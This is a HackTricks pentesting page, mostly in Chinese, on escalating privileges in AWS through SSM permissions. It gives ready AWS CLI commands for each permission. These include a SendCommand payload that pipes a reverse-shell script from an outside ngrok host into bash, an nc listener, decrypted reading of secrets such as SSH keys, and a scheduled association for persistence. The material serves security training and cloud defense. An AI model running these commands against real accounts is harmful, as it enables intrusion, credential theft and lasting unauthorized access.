# AWS - SSM Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## SSM

有关 SSM 的更多信息，请参见：

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### `ssm:SendCommand`

拥有权限 **`ssm:SendCommand`** 的攻击者可以在运行 Amazon SSM Agent 的实例中 **执行命令**，并 **妥协实例内运行的 IAM Role**。
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/4.tcp.ngrok.io:16084 | bash"
```
如果你在已被攻陷的 EC2 实例中使用此技术来 escalate privileges，你可以在本地用以下命令捕获 rev shell：
```bash
# If you are in the machine you can capture the reverseshel inside of it
nc -lvnp 4444 #Inside the EC2 instance
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/127.0.0.1:4444 | bash"
```
**潜在影响：** 对运行着 SSM Agents 的实例上附加的 EC2 IAM 角色进行直接 privesc。

### `ssm:StartSession`

具有权限 **`ssm:StartSession`** 的攻击者可以在运行 Amazon SSM Agent 的实例上**启动类似 SSH 的会话**，并**接管其中运行的 IAM Role**。
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm start-session --target "$INSTANCE_ID"
```
> [!CAUTION]
> 要启动会话，你需要安装 **SessionManagerPlugin**: [https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html](https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html)

**Potential Impact:** 直接 privesc 到附加在正在运行且运行 SSM Agents 的实例上的 EC2 IAM roles。

#### Privesc to ECS

When **ECS tasks** run with **`ExecuteCommand` enabled** users with enough permissions can use `ecs execute-command` to **执行命令** inside the container.\
根据 [**the documentation**](https://aws.amazon.com/blogs/containers/new-using-amazon-ecs-exec-access-your-containers-fargate-ec2/) ，这是通过使用 SSM Session Manager 在用于发起 “_exec_” 命令的设备与目标容器之间创建一个安全通道来实现的。 (SSM Session Manager Plugin 必需才能使其工作)\  
因此，具有 `ssm:StartSession` 权限的用户只需运行以下命令，即可在启用了该选项的 ECS tasks 中 **get a shell inside ECS tasks**：
```bash
aws ssm start-session --target "ecs:CLUSTERNAME_TASKID_RUNTIMEID"
```
![](<../../../images/image (185).png>)

**潜在影响：** 直接对附加到启用了 `ExecuteCommand` 的正在运行任务的 `ECS` IAM 角色进行 privesc。

### `ssm:ResumeSession`

拥有权限 **`ssm:ResumeSession`** 的攻击者可以重新**在运行 Amazon SSM Agent 的实例中启动类似 SSH 的会话**，该实例的 SSM 会话处于**已断开**状态，并**攻陷其内部运行的 IAM Role**。
```bash
# Check for configured instances
aws ssm describe-sessions

# Get resume data (you will probably need to do something else with this info to connect)
aws ssm resume-session \
--session-id Mary-Major-07a16060613c408b5
```
**潜在影响：** 可直接 privesc 到附加在正在运行且安装了 SSM Agents 且会话已断开的实例上的 EC2 IAM 角色。

### `ssm:DescribeParameters`, (`ssm:GetParameter` | `ssm:GetParameters`)

具有上述权限的攻击者将能够列出 **SSM 参数** 并 **以明文读取它们**。在这些参数中，通常可以 **发现敏感信息**，例如 SSH keys 或 API keys。
```bash
aws ssm describe-parameters
# Suppose that you found a parameter called "id_rsa"
aws ssm get-parameters --names id_rsa --with-decryption
aws ssm get-parameter --name id_rsa --with-decryption
```
**Potential Impact:** 在参数中发现敏感信息。

### `ssm:ListCommands`

拥有此权限的攻击者可以列出所有已发送的 **commands**，并有望在其中发现 **敏感信息**。
```
aws ssm list-commands
```
**潜在影响：** 在命令行中发现敏感信息。

### `ssm:GetCommandInvocation`, (`ssm:ListCommandInvocations` | `ssm:ListCommands`)

拥有这些权限的攻击者可以列出所有已发送的 **commands** 并 **读取生成的输出**，从而有可能在其中发现 **敏感信息**。
```bash
# You can use any of both options to get the command-id and instance id
aws ssm list-commands
aws ssm list-command-invocations

aws ssm get-command-invocation --command-id <cmd_id> --instance-id <i_id>
```
**潜在影响：** 在命令行输出中查找敏感信息。

### 使用 ssm:CreateAssociation

具有 **`ssm:CreateAssociation`** 权限的 attacker 可以创建 State Manager Association 来在由 SSM 管理的 EC2 实例上自动执行命令。这些 associations 可以配置为按固定间隔运行，使其适合用于 backdoor-like persistence，而无需交互式会话。
```bash
aws ssm create-association \
--name SSM-Document-Name \
--targets Key=InstanceIds,Values=target-instance-id \
--parameters commands=["malicious-command"] \
--schedule-expression "rate(30 minutes)" \
--association-name association-name
```
> [!NOTE]
> 只要 EC2 实例由 Systems Manager 管理、SSM agent 正在运行，且攻击者具有创建 associations 的权限，该持久化方法就能生效。它不需要交互式会话或显式的 ssm:SendCommand 权限。**重要：** `--schedule-expression` 参数（例如 `rate(30 minutes)`）必须遵守 AWS 的最小间隔 30 分钟。若需立即或一次性执行，请完全省略 `--schedule-expression` —— association 在创建后会执行一次。

### Codebuild

你也可以使用 SSM 进入正在构建的 codebuild 项目：

{{#ref}}
../aws-codebuild-privesc/README.md
{{#endref}}

{{#include ../../../../banners/hacktricks-training.md}}
